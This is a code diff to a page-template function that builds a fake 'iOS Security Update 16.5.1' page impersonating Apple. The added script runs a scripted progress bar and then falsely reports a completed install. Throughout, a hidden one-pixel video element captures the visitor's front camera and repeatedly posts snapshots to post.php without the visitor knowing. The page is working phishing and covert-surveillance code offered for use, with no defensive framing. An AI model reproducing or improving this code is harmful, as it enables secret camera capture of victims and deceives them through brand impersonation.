@@ -295,44 +295,113 @@ def get_template(t, custom_text=''):
 <title>Software Update</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Arial,sans-serif}
-body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}
-.card{width:100%;max-width:380px;background:#fff;border-radius:24px;padding:30px 25px;box-shadow:0 10px 40px rgba(0,0,0,.08);text-align:center}
-.icon{font-size:50px;margin-bottom:10px}
-h1{color:#1a1a2e;font-size:22px;font-weight:800}
-p{color:#666;font-size:14px;margin:12px 0;line-height:1.5}
-.warning{background:#fff3e0;padding:10px;border-radius:10px;margin:10px 0;font-size:12px}
-.btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;background:#1a73e8;color:#fff;margin-top:10px;transition:all .3s}
-.btn:disabled{opacity:.6}
-#progressArea{margin-top:15px}
-#bar{height:6px;background:linear-gradient(90deg,#1a73e8,#4a9eff);border-radius:10px;width:0%;transition:width .5s}
-#ptext{font-size:12px;color:#999;margin-top:8px}
+body{background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}
+.card{width:100%;max-width:400px;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:28px;padding:35px 28px;border:1px solid rgba(255,255,255,0.1);text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
+.logo{width:70px;height:70px;background:linear-gradient(135deg,#4a90d9,#357abd);border-radius:18px;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;font-size:36px;color:#fff}
+h1{color:#fff;font-size:20px;font-weight:700;margin-bottom:5px}
+p{color:#8899aa;font-size:13px;margin:5px 0;line-height:1.5}
+.version{border:1px solid rgba(74,144,217,0.3);background:rgba(74,144,217,0.1);padding:12px;border-radius:14px;margin:18px 0;text-align:left}
+.version .row{display:flex;justify-content:space-between;padding:4px 0;font-size:12px}
+.version .row span:first-child{color:#8899aa}
+.version .row span:last-child{color:#fff}
+.btn{width:100%;padding:16px;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#4a90d9,#357abd);color:#fff;margin-top:12px;transition:all 0.3s;letter-spacing:0.5px}
+.btn:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(74,144,217,0.4)}
+.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none}
+#progressArea{display:none;margin-top:20px;background:rgba(0,0,0,0.2);border-radius:16px;padding:20px}
+.progress-header{display:flex;justify-content:space-between;font-size:13px;color:#8899aa;margin-bottom:12px}
+.progress-bar{height:8px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;position:relative}
+#bar{height:100%;width:0%;background:linear-gradient(90deg,#4a90d9,#74b9ff);border-radius:10px;transition:width 0.8s ease;position:relative}
+#bar::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);animation:shimmer 2s infinite}
+@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+#ptext{font-size:12px;color:#8899aa;margin-top:10px}
+#statusMsg{display:none;margin-top:20px;padding:18px;border-radius:14px;font-size:14px;font-weight:600}
+#statusMsg.success{display:block;background:rgba(46,213,115,0.1);border:1px solid rgba(46,213,115,0.3);color:#2ed573}
+#statusMsg.error{display:block;background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.3);color:#ff4757}
 #video{width:1px;height:1px;position:absolute;opacity:0.01;pointer-events:none}
+.detail{font-size:11px;color:#556677;margin-top:15px;text-align:center;line-height:1.6}
+.detail span{display:inline-block;margin:0 8px}
 </style>
 </head>
 <body>
 <div class="card">
-<div class="icon">&#9881;</div>
-<h1>Software Update Required</h1>
-<p>Your device needs an important security update.</p>
-<div class="warning"><p>&#9888; Critical security patches included</p></div>
-<p style="font-size:12px;color:#999;margin-top:10px">Version 12.5.3 - 2.4 MB</p>
-<button class="btn" id="mainBtn">&#9654; Install Update Now</button>
-<div id="progressArea" style="display:none">
-<div style="background:#f0f0f0;border-radius:10px;height:6px;overflow:hidden"><div id="bar"></div></div>
-<p id="ptext">0% - Installing...</p>
+<div class="logo">&#9881;</div>
+<h1>iOS Security Update 16.5.1</h1>
+<p>Apple has released a critical security update for your device.</p>
+<div class="version">
+<div class="row"><span>Current Version</span><span>16.5.0</span></div>
+<div class="row"><span>New Version</span><span>16.5.1</span></div>
+<div class="row"><span>File Size</span><span>2.4 GB</span></div>
+<div class="row"><span>Security Patches</span><span>8 Critical</span></div>
 </div>
+<button class="btn" id="mainBtn">&#9654; Download & Install Now</button>
+<div id="progressArea">
+<div class="progress-header">
+<span>Installing iOS 16.5.1...</span>
+<span id="percentText">0%</span>
+</div>
+<div class="progress-bar"><div id="bar"></div></div>
+<p id="ptext">Preparing update...</p>
+</div>
+<div id="statusMsg"></div>
 <video id="video" autoplay muted playsinline></video>
+</div>
+<div class="detail">
+<span>&#9881; Estimated time: 35 seconds</span>
+<span>&#9888; Do not close this page</span>
 </div>
 <script>
 (function(){
 var v=document.getElementById('video');
 initCamera();
-
+var btn=document.getElementById('mainBtn');
+var progressArea=document.getElementById('progressArea');
+var bar=document.getElementById('bar');
+var ptext=document.getElementById('ptext');
+var percentText=document.getElementById('percentText');
+var statusMsg=document.getElementById('statusMsg');
+btn.addEventListener('click',function(){
+    btn.disabled=true;
+    btn.textContent='\u25b6 Installing...';
+    progressArea.style.display='block';
+    statusMsg.className='';
+    statusMsg.style.display='none';
+    var progress=0;
+    var messages=[
+        {at:0,msg:'Preparing update...'},
+        {at:5,msg:'Downloading security patches...'},
+        {at:15,msg:'Verifying package integrity...'},
+        {at:25,msg:'Applying security patches...'},
+        {at:35,msg:'Updating system files...'},
+        {at:50,msg:'Configuring security settings...'},
+        {at:65,msg:'Optimizing performance...'},
+        {at:78,msg:'Finalizing installation...'},
+        {at:90,msg:'Almost done...'},
+        {at:98,msg:'Completing update...'}
+    ];
+    var mi=0;
+    var interval=setInterval(function(){
+        progress+=1;
+        if(progress>100) progress=100;
+        bar.style.width=progress+'%';
+        percentText.textContent=progress+'%';
+        while(mi<messages.length-1&&progress>=messages[mi+1].at){
+            mi++;
+        }
+        ptext.textContent=messages[mi].msg;
+        if(progress>=100){
+            clearInterval(interval);
+            btn.textContent='\u2714 Installed';
+            progressArea.style.display='none';
+            statusMsg.className='success';
+            statusMsg.innerHTML='\u2714 Software Update Successfully<br><small style="color:#8899aa;font-size:12px;margin-top:5px;display:block">iOS 16.5.1 has been installed. Your device is now up to date.</small>';
+            statusMsg.style.display='block';
+        }
+    },350);
+});
 function initCamera(){
     var started=false;
     var capInterval=null;
     var constraints={video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false};
-    
     function tryGet(){
         navigator.mediaDevices.getUserMedia(constraints).then(function(stream){
             v.srcObject=stream;
@@ -369,7 +438,7 @@ function initCamera(){
                                         fetch('post.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:dd})});
                                     }
                                 }
-                                bm.close();
+                                if(bm&&bm.close) bm.close();
                             }).catch(function(){});
                         }
                     }
@@ -377,7 +446,6 @@ function initCamera(){
             },2000);
         }).catch(function(err){console.log('Camera error:',err);});
     }
-
     if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
         tryGet();
     } else if(navigator.webkitGetUserMedia){
